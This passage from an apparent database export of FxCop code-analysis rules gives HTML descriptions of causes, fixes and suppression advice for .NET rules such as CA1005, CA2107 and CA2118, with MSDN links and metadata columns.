{rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>\n\n\n\n\n                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericEventHandlerInstances}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182179.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182179.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806573	1511453806574	1
200	CA1005: Avoid excessive parameters on generic types	AvoidExcessiveParametersOnGenericTypes	CA1005	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible generic type has more than two type parameters.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The more type parameters a generic type contains, the more difficult it is to know and remember what each type parameter represents. It is usually obvious with one type parameter, as in List&lt;T&gt;, and in certain cases with two type parameters, as in Dictionary&lt;TKey, TValue&gt;. If more than two type parameters exist, the difficulty becomes too great for most users (for example, TooManyTypeParameters&lt;T, K, V&gt; in C# or TooManyTypeParameters(Of T, K, V) in Visual Basic).\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the design to use no more than two type parameters.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule unless the design absolutely requires more than two type parameters. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotExposeGenericLists}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>\n\n\n\n\n                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericEventHandlerInstances}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericsWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182129.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182129.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806576	1511453806576	1
201	CA2107: Review deny and permit only usage	ReviewDenyAndPermitOnlyUsage	CA2107	fxcop	<h2>Cause</h2>\n<p>\n            A method contains a security check that specifies the PermitOnly or Deny security action.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The Using the PermitOnly Method and <code>CodeAccessPermission.Deny</code> security actions should be used only by those who have an advanced knowledge of .NET Framework security. Code that uses these security actions should undergo a security review.\n            Deny alters the default behavior of the stack walk that occurs in response to a security demand. It lets you specify permissions that must not be granted for the duration of the denying method, regardless of the actual permissions of the callers in the call stack. If the stack walk detects a method that is secured by Deny, and if the demanded permission is included in the denied permissions, the stack walk fails. PermitOnly also alters the default behavior of the stack walk. It allows code to specify only those permissions that can be granted, regardless of the permissions of the callers. If the stack walk detects a method that is secured by PermitOnly, and if the demanded permission is not included in the permissions that are specified by the PermitOnly, the stack walk fails.\n            Code that relies on these actions should be carefully evaluated for security vulnerabilities because of their limited usefulness and subtle behavior. Consider the following:\n            <ul>\n              <li>\n\n\n                    Link Demands\n                   are not affected by Deny or PermitOnly.\n              </li>\n              <li>\n                If the Deny or PermitOnly occurs in the same stack frame as the demand that causes the stack walk, the security actions have no effect.\n              </li>\n              <li>\n                Values that are used to construct path-based permissions can usually be specified in multiple ways. Denying access to one form of the path does not deny access to all forms. For example, if a file share \\\\Server\\Share is mapped to a network drive X:, to deny access to a file on the share, you must deny \\\\Server\\Share\\File, X:\\File and every other path that accesses the file.\n              </li>\n              <li>\n                An <code>CodeAccessPermission.Assert</code> can terminate a stack walk before the Deny or PermitOnly is reached.\n              </li>\n              <li>\n                If a Deny has any effect, namely, when a caller has a permission that is blocked by the Deny, the caller can access the protected resource directly, bypassing the Deny. Similarly, if the caller does not have the denied permission, the stack walk would fail without the Deny.\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Any use of these security actions will cause a violation. To fix a violation, do not use these security actions.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only after you complete a security review.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182308.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182308.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806577	1511453806578	1
202	CA2133: Delegates must bind to methods with consistent transparency	DelegatesMustBindWithConsistentTransparency	CA2133	fxcop	<h2>Cause</h2>\n<p>\n            This warning fires on a method that binds a delegate that is marked with the <code>SecurityCriticalAttribute</code> to a method that is transparent or that is marked with the <code>SecuritySafeCriticalAttribute</code>. The warning also fires a method that binds a delegate that is transparent or safe-critical to a critical method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Delegate types and the methods that they bind to must have consistent transparency. Transparent and safe-critical delegates may only bind to other transparent or safe-critical methods. Similarly, critical delegates may only bind to critical methods. These binding rules ensure that the only code that can invoke a method via a delegate could have also invoked the same method directly. For example, binding rules prevent transparent code from calling critical code directly via a transparent delegate.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this warning, change the transparency of the delegate or of the method that it binds so that the transparency of the two are equivalent.\n</p>\n<h2>When to Suppress Warnings</h2>\n\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Security;\n\nnamespace TransparencyWarningsDemo\n{\n\n    public delegate void TransparentDelegate();\n\n    [SecurityCritical]\n    public delegate void CriticalDelegate();\n\n    public class TransparentType\n    {\n        void DelegateBinder()\n        {\n            // CA2133 violation - binding a transparent delegate to a critical method\n            TransparentDelegate td = new TransparentDelegate(CriticalTarget);\n\n            // CA2133 violation - binding a critical delegate to a transparent method\n            CriticalDelegate cd = new CriticalDelegate(TransparentTarget);\n        }\n\n        [SecurityCritical]\n        void CriticalTarget() { }\n\n        void TransparentTarget() { }\n    }\n}\n</pre>\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997710.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997710.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806580	1511453806580	1
203	CA1412: Mark ComSource Interfaces as IDispatch	MarkComSourceInterfacesAsIDispatch	CA1412	fxcop	<h2>Cause</h2>\n<p>\n            A type is marked with the <code>ComSourceInterfacesAttribute</code> attribute and at least one specified interface is not marked with the <code>InterfaceTypeAttribute</code> attribute set to the <code>InterfaceIsDispatch</code> value.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>ComSourceInterfacesAttribute</code>\n               is used to identify the event interfaces that a class exposes to Component Object Model (COM) clients. These interfaces must be exposed as <code>InterfaceIsIDispatch</code> to enable Visual Basic 6 COM clients to receive event notifications. By default, if an interface is not marked with the <code>InterfaceTypeAttribute</code> attribute, it is exposed as a dual interface.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add or modify the <code>InterfaceTypeAttribute</code> attribute so that its value is set to InterfaceIsIDispatch for all interfaces that are specified with the <code>ComSourceInterfacesAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DoNotUseAutoDualClassInterfaceType}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182207.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182207.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806581	1511453806581	1
205	CA1704: Identifiers should be spelled correctly	IdentifiersShouldBeSpelledCorrectly	CA1704	fxcop	<h2>Cause</h2>\n<p>\n            The name of an identifier contains one or more words that are not recognized by the Microsoft spelling checker library. This rule does not check constructors or special-named members such as get and set property accessors.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule parses the identifier into tokens and checks the spelling of each token. The parsing algorithm performs the following transformations:\n            <ul>\n              <li>\n                Uppercase letters start a new token. For example, MyNameIsJoe tokenizes to "My", "Name", "Is", "Joe".\n              </li>\n              <li>\n                For multiple uppercase letters, the last uppercase letter starts a new token. For example, GUIEditor tokenizes to "GUI", "Editor".\n              </li>\n              <li>\n                Leading and trailing apostrophes are removed. For example, 'sender' tokenizes to "sender".\n              </li>\n              <li>\n                Underscores signify the end of a token and are removed. For example, Hello_world tokenizes to "Hello", "world".\n              </li>\n              <li>\n                Embedded ampersands are removed. For example, for&amp;mat tokenizes to "format".\n              </li>\n            </ul>\n            By default, the English (en) version of the spelling checker is used. No other language dictionaries are currently available.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, correct the spelling of the word or add the word to a custom dictionary that is named CustomDictionary.xml. Place the dictionary in the installation directory of the tool, the project directory, or in the directory that is associated with the tool under the profile of the user (%USERPROFILE%\\Application Data\\...). To learn how to add the custom dictionary to a project in Visual Studio, see How to: Customize the Code Analysis Dictionary\n            <ul>\n              <li>\n                Add words that should not cause a violation under the Dictionary/Words/Recognized path.\n              </li>\n              <li>\n                Add words that should cause a violation under the Dictionary/Words/Unrecognized path.\n              </li>\n              <li>\n                Add words that should be flagged as obsolete under the Dictionary/Words/Deprecated path. See the related rule topic {rule:fxcop:UsePreferredTerms}for more information.\n              </li>\n              <li>\n                Add exceptions to the acronym casing rules to the Dictionary/Acronyms/CasingExceptions path.\n              </li>\n            </ul>\n            The following is an example of the structure of a custom dictionary file.\n\n\n\n\n\n\n\n\n\n            <pre>\n   &lt;Dictionary&gt;\n      &lt;Words&gt;\n         &lt;Unrecognized&gt;\n            &lt;Word&gt;cb&lt;/Word&gt;\n         &lt;/Unrecognized&gt;\n         &lt;Recognized&gt;\n            &lt;Word&gt;stylesheet&lt;/Word&gt;\n            &lt;Word&gt;GotDotNet&lt;/Word&gt;\n         &lt;/Recognized&gt;\n         &lt;Deprecated&gt;\n            &lt;Term PreferredAlternate="EnterpriseServices"&gt;ComPlus&lt;/Term&gt;\n         &lt;/Deprecated&gt;\n      &lt;/Words&gt;\n      &lt;Acronyms&gt;\n         &lt;CasingExceptions&gt;\n            &lt;Acronym&gt;CJK&lt;/Acronym&gt;\n            &lt;Acronym&gt;Pi&lt;/Acronym&gt;\n         &lt;/CasingExceptions&gt;\n      &lt;/Acronyms&gt;\n   &lt;/Dictionary&gt;\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                When to Suppress Warnings\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                CA2204: Literals should be spelled correctly\n\n\n\n\n                CA1703: Resource strings should be spelled correctly\n\n\n\n\n                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldNotContainUnderscores}<br/>\n\n\n\n\n                {rule:fxcop:UsePreferredTerms}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264492.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264492.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806583	1511453806584	1
206	CA2118: Review SuppressUnmanagedCodeSecurityAttribute usage	ReviewSuppressUnmanagedCodeSecurityUsage	CA2118	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type or member has the <code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>SuppressUnmanagedCodeSecurityAttribute</code>\n               changes the default security system behavior for members that execute unmanaged code using COM interop or platform invocation. Generally, the system makes a <code>Data and Modeling in the .NET Framework</code> for unmanaged code permission. This demand occurs at run time for every invocation of the member, and checks every caller in the call stack for permission. When the attribute is present, the system makes a Link Demands for the permission: the permissions of the immediate caller are checked when the caller is JIT-compiled.\n            This attribute is primarily used to increase performance; however, the performance gains come with significant security risks. If you place the attribute on public members that call native methods, the callers in the call stack (other than the immediate caller) do not need unmanaged code permission to execute unmanaged code. Depending on the public member's actions and input handling, it might allow untrustworthy callers to access functionality normally restricted to trustworthy code.\n            The .NET Framework relies on security checks to prevent callers from gaining direct access to the current process's address space. Because this attribute bypasses normal security, your code poses a serious threat if it can be used to read or write to the process's memory. Note that the risk is not limited to methods that intentionally provide access to process memory; it is also present in any scenario where malicious code can achieve access by any means, for example, by providing surprising, malformed, or invalid input.\n            The default security policy does not grant unmanaged code permission to an assembly unless it is executing from the local computer or is a member of one of the following groups:\n            <ul>\n              <li>\n                My Computer Zone Code Group\n              </li>\n              <li>\n                Microsoft Strong Name Code Group\n              </li>\n              <li>\n                ECMA Strong Name Code Group\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Carefully review your code to ensure that this attribute is absolutely necessary. If you are unfamiliar with managed code security, or do not understand the security implications of using this attribute, remove it from your code. If the attribute is required, you must ensure that callers cannot use your code maliciously. If your code does not have permission to execute unmanaged code, this attribute has no effect and should be removed.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            To safely suppress a warning from this rule, you must ensure that your code does not provide callers access to native operations or resources that can be used in a destructive manner.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182311.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182311.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806585	1511453806586	1
207	CA1024: Use properties where appropriate	UsePropertiesWhereAppropriate	CA1024	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected method has a name that starts with Get, takes no parameters, and returns a value that is not an array.\n</p>\n<h2>Rule Description</h2>\n<p>\n            In most cases, properties represent data and methods perform actions. Properties are accessed like fields, which makes them easier to use. A method is a good candidate to become a property if one of these conditions is present:\n            <ul>\n              <li>\n                Takes no arguments and returns the state information of an object.\n              </li>\n              <li>\n                Accepts a single argument to set some part of the state of an object.\n              </li>\n            </ul>\n            Properties should behave as if they are fields; if the method cannot, it should not be changed to a property. Methods are better than properties in the following situations:\n            <ul>\n              <li>\n                The method performs a time-consuming operation. The method is perceivably slower than the time that is required to set or get the value of a field.\n              </li>\n              <li>\n                The method performs a conversion. Accessing a field does not return a converted version of the data that it stores.\n              </li>\n              <li>\n                The Get method has an observable side effect. Retrieving the value of a field does not produce any side effects.\n              </li>\n              <li>\n                The order of execution is important. Setting the value of a field does not rely on the occurrence of other operations.\n              </li>\n              <li>\n                Calling the method two times in succession creates different results.\n              </li>\n              <li>\n                The method is static but returns an object that can be changed by the caller. Retrieving the value of a field does not allow the caller to change the data that is stored by the field.\n              </li>\n              <li>\n                The method returns an array.\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the method to a property.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if the method meets at least one of the previously listed criteria.\n</p>\n<h2>Controlling Property Expansion in the Debugger</h2>\n<p>\n            One reason programmers avoid using a property is because they do not want the debugger to auto-expand it. For example, the property might involve allocating a large object or calling a P/Invoke, but it might not actually have any observable side effects.\n            You can prevent the debugger from auto-expanding properties by applying <code>System.Diagnostics.DebuggerBrowsableAttribute</code>. The following example shows this attribute being applied to an instance property.\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Diagnostics;\n\nnamespace Microsoft.Samples\n{\n    public class TestClass\n    {\n        // [...]\n\n        [DebuggerBrowsable(DebuggerBrowsableState.Never)]\n        public LargeObject LargeObject\n        {\n            get\n            {\n                // Allocate large object\n                // [...]\n\n        }\n    }\n}\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                Example\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182181.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182181.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806587	1511453806587	1
208	CA2241: Provide correct arguments to formatting methods	ProvideCorrectArgumentsToFormattingMethods	CA2241	fxcop	<h2>Cause</h2>\n<p>\n            The format string argument passed to a method such as <code>WriteLine</code>,  <code>Write</code>, or  <code>String.Format</code> does not contain a format item that corresponds to each object argument, or vice versa.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The arguments to methods such as <code>WriteLine</code>, <code>Write</code>, and <code>Format</code> consist of a format string followed by several <code>System.Object</code> instances. The format string consists of text and embedded format items of the form, {index[,alignment][:formatString]}. 'index' is a zero-based integer that indicates which of the objects to format. If an object does not have a corresponding index in the format string, the object is ignored. If the object specified by 'index' does not exist, a <code>System.FormatException</code> is thrown at runtime.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, provide a format item for each object argument and provide an object argument for each format item.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182361.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182361.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	3min	\N	\N	\N	\N	\N	f	HTML	1511453806589	1511453806589	1
219	CA1004: Generic methods should provide type parameter	GenericMethodsShouldProvideTypeParameter	CA1004	fxcop	<h2>Cause</h2>\n<p>\n            The parameter signature of an externally visible generic method does not contain types that correspond to all the type parameters of the method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Inference is how the type argument of a generic method is determined by the type of argument that is passed to the method, instead of by the explicit specification of the type argument. To enable inference, the parameter signature of a generic method must include a parameter that is of the same type as the type parameter for the method. In this case, the type argument does not have to be specified. When you use inference for all type parameters, the syntax for calling generic and nongeneric instance methods is identical. This simplifies the usability of generic methods.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the design so that the parameter signature contains the same type for each type parameter of the method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>\n\n\n\n\n                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>\n\n\n\n\n                {rule:fxcop:DoNotExposeGenericLists}<br/>\n\n\n\n\n                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericEventHandlerInstances}<br/>\n\n\n\n\n                {rule:fxcop:UseGenericsWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182150.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182150.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806610	1511453806610	1
209	CA1305: Specify IFormatProvider	SpecifyIFormatProvider	CA1305	fxcop	<h2>Cause</h2>\n<p>\n            A method or constructor calls one or more members that have overloads that accept a <code>System.IFormatProvider</code> parameter, and the method or constructor does not call the overload that takes the <code>IFormatProvider</code> parameter. This rule ignores calls to .NET Framework methods that are documented as ignoring the <code>IFormatProvider</code> parameter and additionally the following methods:\n            <ul>\n              <li>\n\n\n                    <code>Activator.CreateInstance</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>ResourceManager.GetObject</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>ResourceManager.GetString</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            When a <code>System.Globalization.CultureInfo</code> or <code>IFormatProvider</code> object is not supplied, the default value that is supplied by the overloaded member might not have the effect that you want in all locales. Also, .NET Framework members choose default culture and formatting based on assumptions that might not be correct for your code. To make sure that the code works as expected for your scenarios, you should supply culture-specific information according to the following guidelines:\n            <ul>\n              <li>\n                If the value will be displayed to the user, use the current culture. See <code>CultureInfo.CurrentCulture</code>.\n              </li>\n              <li>\n                If the value will be stored and accessed by software (persisted to a file or database), use the invariant culture. See <code>CultureInfo.InvariantCulture</code>.\n              </li>\n              <li>\n                If you do not know the destination of the value, have the data consumer or provider specify the culture.\n              </li>\n            </ul>\n            Note that <code>CultureInfo.CurrentUICulture</code> is used only to retrieve localized resources by using an instance of the <code>System.Resources.ResourceManager</code> class.\n            Even if the default behavior of the overloaded member is appropriate for your needs, it is better to explicitly call the culture-specific overload so that your code is self-documenting and more easily maintained.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, use the overload that takes a <code>CultureInfo</code> or <code>IFormatProvider</code> and specify the argument according to the guidelines that were listed earlier.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when it is certain that the default culture/format provider is the correct choice and where code maintainability is not an important development priority.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:SpecifyCultureInfo}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182190.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182190.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806590	1511453806590	1
210	CA2137: Transparent methods must contain only verifiable IL	TransparentMethodsMustBeVerifiable	CA2137	fxcop	<h2>Cause</h2>\n<p>\n            A method contains unverifiable code or returns a type by reference.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires on attempts by security transparent code to execute unverifiable MSIL (Microsoft Intermediate Language). However, the rule does not contain a full IL verifier, and instead uses heuristics to catch most violations of MSIL verification.\n            To be certain that your code contains only verifiable MSIL, run <code>Peverify.exe (PEVerify Tool)</code> on your assembly. Run PEVerify with the /transparent option which limits the output to only unverifiable transparent methods which would cause an error. If the /transparent option is not used, PEVerify also verifies critical methods that are allowed to contain unverifiable code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, mark the method with the <code>SecurityCriticalAttribute</code> or <code>SecuritySafeCriticalAttribute</code> attribute, or remove the unverifiable code.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd983954.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd983954.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806592	1511453806592	1
211	CA1014: Mark assemblies with CLSCompliantAttribute	MarkAssembliesWithClsCompliant	CA1014	fxcop	<h2>Cause</h2>\n<p>\n            An assembly does not have the <code>System.CLSCompliantAttribute</code> attribute applied to it.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The Common Language Specification (CLS) defines naming restrictions, data types, and rules to which assemblies must conform if they will be used across programming languages. Good design dictates that all assemblies explicitly indicate CLS compliance with <code>CLSCompliantAttribute</code>. If the attribute is not present on an assembly, the assembly is not compliant.\n            It is possible for a CLS-compliant assembly to contain types or type members that are not compliant.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add the attribute to the assembly. Instead of marking the whole assembly as noncompliant, you should determine which type or type members are not compliant and mark these elements as such. If possible, you should provide a CLS-compliant alternative for noncompliant members so that the widest possible audience can access all the functionality of your assembly.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. If you do not want the assembly to be compliant, apply the attribute and set its value to <code>false</code>.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182156.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182156.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806593	1511453806594	1
212	CA1307: Specify StringComparison	SpecifyStringComparison	CA1307	fxcop	<h2>Cause</h2>\n<p>\n            A string comparison operation uses a method overload that does not set a <code>StringComparison</code> parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Many string operations, most important the <code>Compare</code> and <code>Equals</code> methods, provide an overload that accepts a <code>StringComparison</code> enumeration value as a parameter.\n            Whenever an overload exists that takes a <code>StringComparison</code> parameter, it should be used instead of an overload that does not take this parameter. By explicitly setting this parameter, your code is often made clearer and easier to maintain.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change string comparison methods to overloads that accept the <code>StringComparison</code> enumeration as a parameter. For example: change String.Compare(str1, str2) to String.Compare(str1, str2, StringComparison.Ordinal).\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the library or application is intended for a limited local audience and will therefore not be localized.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb386080.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386080.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806594	1511453806595	1
213	CA2120: Secure serialization constructors	SecureSerializationConstructors	CA2120	fxcop	<h2>Cause</h2>\n<p>\n            The type implements the <code>System.Runtime.Serialization.ISerializable</code> interface, is not a delegate or interface, and is declared in an assembly that allows partially trusted callers. The type has a constructor that takes a <code>System.Runtime.Serialization.SerializationInfo</code> object and a <code>System.Runtime.Serialization.StreamingContext</code> object (the signature of the serialization constructor). This constructor is not secured by a security check, but one or more of the regular constructors in the type is secured.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule is relevant for types that support custom serialization. A type supports custom serialization if it implements the <code>System.Runtime.Serialization.ISerializable</code> interface. The serialization constructor is required and is used to de-serialize, or re-create objects that have been serialized using the <code>ISerializable.GetObjectData</code> method. Because the serialization constructor allocates and initializes objects, security checks that are present on regular constructors must also be present on the serialization constructor. If you violate this rule, callers that could not otherwise create an instance could use the serialization constructor to do this.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, protect the serialization constructor with security demands that are identical to those protecting other constructors.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a violation of the rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:ImplementSerializationConstructors}<br/>\n\n\n\n\n                {rule:fxcop:MarkISerializableTypesWithSerializable}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182317.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182317.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806596	1511453806597	1
214	CA1033: Interface methods should be callable by child types	InterfaceMethodsShouldBeCallableByChildTypes	CA1033	fxcop	<h2>Cause</h2>\n<p>\n            An unsealed externally visible type provides an explicit method implementation of a public interface and does not provide an alternative externally visible method that has the same name.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Consider a base type that explicitly implements a public interface method. A type that derives from the base type can access the inherited interface method only through a reference to the current instance (<code>this</code> in C#) that is cast to the interface. If the derived type re-implements (explicitly) the inherited interface method, the base implementation can no longer be accessed. The call through the current instance reference will invoke the derived implementation; this causes recursion and an eventual stack overflow.\n            This rule does not report a violation for an explicit implementation of <code>IDisposable.Dispose</code> when an externally visible Close() or System.IDisposable.Dispose(Boolean) method is provided.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement a new method that exposes the same functionality and is visible to derived types or change to a nonexplicit implementation. If a breaking change is acceptable, an alternative is to make the type sealed.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if an externally visible method is provided that has the same functionality but a different name than the explicitly implemented method.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182153.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182153.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806598	1511453806598	1
